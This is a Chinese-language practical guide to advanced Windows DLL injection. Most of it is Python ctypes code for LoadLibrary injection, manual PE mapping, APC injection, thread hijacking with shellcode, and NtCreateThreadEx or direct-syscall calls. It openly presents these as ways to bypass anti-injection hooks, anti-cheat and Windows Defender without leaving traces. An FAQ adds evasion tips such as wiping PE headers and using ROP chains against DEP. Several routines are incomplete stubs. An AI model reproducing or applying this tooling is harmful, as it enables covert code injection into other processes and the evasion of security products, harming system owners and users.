# DLL 注入进阶实战指南

## 适用场景
- 绕过反注入保护（CreateRemoteThread 被拦截）
- 高级注入技术：手动映射、APC、线程劫持
- 无痕注入（不留下 LoadLibrary 痕迹）

## 核心工具链

| 技术 | 用途 | 复杂度 |
|------|------|--------|
| CreateRemoteThread + LoadLibrary | 基础 DLL 注入 | 低 |
| Manual Mapping | 手动映射 PE 文件 | 高 |
| APC 注入 | 异步过程调用注入 | 中 |
| Thread Hijacking | 线程上下文劫持 | 高 |
| Process Hollowing | 进程镂空 | 高 |
| Reflective DLL Injection | 反射注入 | 高 |

## 标准流程

### 1. 基础注入（Python）
```python
import ctypes
from ctypes import wintypes

class DLLInjector:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        
    def inject_loadlibrary(self, pid: int, dll_path: str):
        """基础 LoadLibrary 注入"""
        # 打开目标进程
        PROCESS_ALL_ACCESS = 0x1F0FFF
        hProcess = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        
        # 分配内存
        dll_path_bytes = dll_path.encode('utf-16le') + b'\x00\x00'
        mem_size = len(dll_path_bytes)
        
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_READWRITE = 0x04
        
        remote_mem = self.kernel32.VirtualAllocEx(
            hProcess, 0, mem_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        )
        
        # 写入 DLL 路径
        self.kernel32.WriteProcessMemory(hProcess, remote_mem, dll_path_bytes, mem_size, 0)
        
        # 获取 LoadLibraryW 地址
        hKernel32 = self.kernel32.GetModuleHandleW("kernel32.dll")
        loadlibrary_addr = self.kernel32.GetProcAddress(hKernel32, b"LoadLibraryW")
        
        # 创建远程线程
        self.kernel32.CreateRemoteThread(hProcess, 0, 0, loadlibrary_addr, remote_mem, 0, 0)
        
        # 清理
        self.kernel32.VirtualFreeEx(hProcess, remote_mem, 0, 0x8000)
        self.kernel32.CloseHandle(hProcess)
```

### 2. 手动映射（Manual Mapping）
```python
class ManualMapper:
    """
    手动映射 PE 文件到目标进程
    不调用 LoadLibrary，无痕注入
    """
    
    def map_dll(self, pid: int, dll_bytes: bytes):
        # 1. 解析 PE 头
        dos_header = self._parse_dos_header(dll_bytes)
        nt_headers = self._parse_nt_headers(dll_bytes, dos_header.e_lfanew)
        
        # 2. 在目标进程分配内存
        image_size = nt_headers.OptionalHeader.SizeOfImage
        hProcess = self.kernel32.OpenProcess(0x1F0FFF, False, pid)
        
        remote_base = self.kernel32.VirtualAllocEx(
            hProcess, 0, image_size, 0x1000 | 0x2000, 0x40  # PAGE_EXECUTE_READWRITE
        )
        
        # 3. 复制 PE 头
        headers_size = nt_headers.OptionalHeader.SizeOfHeaders
        self.kernel32.WriteProcessMemory(hProcess, remote_base, dll_bytes[:headers_size], headers_size, 0)
        
        # 4. 复制各节区
        for section in self._get_sections(dll_bytes, nt_headers):
            section_data = dll_bytes[section.PointerToRawData:section.PointerToRawData + section.SizeOfRawData]
            remote_section = remote_base + section.VirtualAddress
            self.kernel32.WriteProcessMemory(hProcess, remote_section, section_data, len(section_data), 0)
        
        # 5. 修复重定位表
        self._fix_relocations(hProcess, remote_base, nt_headers, dll_bytes)
        
        # 6. 修复导入表
        self._fix_imports(hProcess, remote_base, nt_headers)
        
        # 7. 执行 TLS 回调
        self._execute_tls(hProcess, remote_base, nt_headers)
        
        # 8. 调用 DllMain
        dll_main_rva = nt_headers.OptionalHeader.AddressOfEntryPoint
        dll_main_addr = remote_base + dll_main_rva
        
        # 创建远程线程执行 DllMain
        self.kernel32.CreateRemoteThread(hProcess, 0, 0, dll_main_addr, remote_base, 1, 0)  # DLL_PROCESS_ATTACH
        
        return remote_base
```

### 3. APC 注入
```python
class APCInjector:
    """
    异步过程调用注入
    向目标线程的 APC 队列插入函数
    """
    
    def inject_apc(self, pid: int, tid: int, dll_path: str):
        """
        tid: 目标线程 ID（主线程或工作线程）
        """
        hProcess = self.kernel32.OpenProcess(0x1F0FFF, False, pid)
        hThread = self.kernel32.OpenThread(0x1F03FF, False, tid)
        
        # 分配内存并写入 DLL 路径
        dll_path_bytes = dll_path.encode('utf-16le') + b'\x00\x00'
        remote_mem = self.kernel32.VirtualAllocEx(
            hProcess, 0, len(dll_path_bytes), 0x1000 | 0x2000, 0x04
        )
        self.kernel32.WriteProcessMemory(hProcess, remote_mem, dll_path_bytes, len(dll_path_bytes), 0)
        
        # 获取 LoadLibraryW 地址
        hKernel32 = self.kernel32.GetModuleHandleW("kernel32.dll")
        loadlibrary_addr = self.kernel32.GetProcAddress(hKernel32, b"LoadLibraryW")
        
        # 插入 APC
        self.kernel32.QueueUserAPC(loadlibrary_addr, hThread, remote_mem)
        
        # 恢复线程（如果挂起）
        self.kernel32.ResumeThread(hThread)
        
        self.kernel32.CloseHandle(hThread)
        self.kernel32.CloseHandle(hProcess)
```

### 4. 线程劫持
```python
class ThreadHijacker:
    """
    劫持目标线程的执行上下文
    """
    
    def hijack_thread(self, pid: int, tid: int, shellcode: bytes):
        hThread = self.kernel32.OpenThread(0x1F03FF, False, tid)
        
        # 挂起线程
        self.kernel32.SuspendThread(hThread)
        
        # 获取线程上下文
        CONTEXT = ctypes.c_void_p  # 简化，实际需定义完整结构
        ctx = self._get_thread_context(hThread)
        
        # 在目标进程分配可执行内存
        hProcess = self.kernel32.OpenProcess(0x1F0FFF, False, pid)
        remote_mem = self.kernel32.VirtualAllocEx(
            hProcess, 0, len(shellcode), 0x1000 | 0x2000, 0x40
        )
        self.kernel32.WriteProcessMemory(hProcess, remote_mem, shellcode, len(shellcode), 0)
        
        # 修改 EIP/RIP 指向 shellcode
        # x86: ctx.Eip = remote_mem
        # x64: ctx.Rip = remote_mem
        
        # 设置上下文
        self._set_thread_context(hThread, ctx)
        
        # 恢复线程
        self.kernel32.ResumeThread(hThread)
```

## 反注入绕过

### 1. 绕过 CreateRemoteThread 检测
```python
def inject_without_createthread(pid, dll_path):
    """
    使用 NtCreateThreadEx（系统调用）绕过 Hook
    """
    ntdll = ctypes.windll.ntdll
    
    # NtCreateThreadEx 比 CreateRemoteThread 更底层
    # 很多反作弊只 Hook 了 CreateRemoteThread
    
    hProcess = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
    
    # 手动构造系统调用
    # 或使用直接系统调用（Direct Syscall）
    
    # 分配内存
    remote_mem = ...  # 同上
    
    # 使用 NtCreateThreadEx
    hThread = wintypes.HANDLE()
    ntdll.NtCreateThreadEx(
        ctypes.byref(hThread),
        0x1FFFFF,  # MAXIMUM_ACCESS
        None,
        hProcess,
        loadlibrary_addr,
        remote_mem,
        False,  # CreateSuspended
        0, 0, 0, 0
    )
```

### 2. 直接系统调用（Direct Syscall）
```python
class DirectSyscall:
    """
    直接从 ntdll 提取系统调用号，绕过用户层 Hook
    """
    
    def get_syscall_number(self, func_name: str) -> int:
        """从 ntdll 提取系统调用号"""
        ntdll_path = r"C:\Windows\System32\ntdll.dll"
        with open(ntdll_path, 'rb') as f:
            data = f.read()
            
        # 定位导出表
        # 解析 PE 结构找到函数地址
        # 提取 mov eax, syscall_number
        
        return syscall_number
    
    def execute_syscall(self, syscall_num: int, *args):
        """执行直接系统调用"""
        # 使用汇编/Shellcode 执行
        # syscall
        # ret
        pass
```

## 常见问题

### Q: 被 Windows Defender / 反作弊拦截？
- 使用手动映射（无 LoadLibrary 痕迹）
- 使用直接系统调用
- 注入前清理 PE 头

### Q: 目标进程有 DEP/ASLR？
- 使用 ROP 链绕过 DEP
- 计算基址 + 偏移处理 ASLR

### Q: 64位注入 32位进程？
- 必须使用 32位注入器
- 64位和32位系统调用不兼容

## 参考项目
- ReflectiveDLLInjection: https://github.com/stephenfewer/ReflectiveDLLInjection (⭐ 3.5k)
- sRDI: https://github.com/monoxgas/sRDI (⭐ 1.8k)
- SysWhispers: https://github.com/jthuraisamy/SysWhispers (⭐ 2.1k)
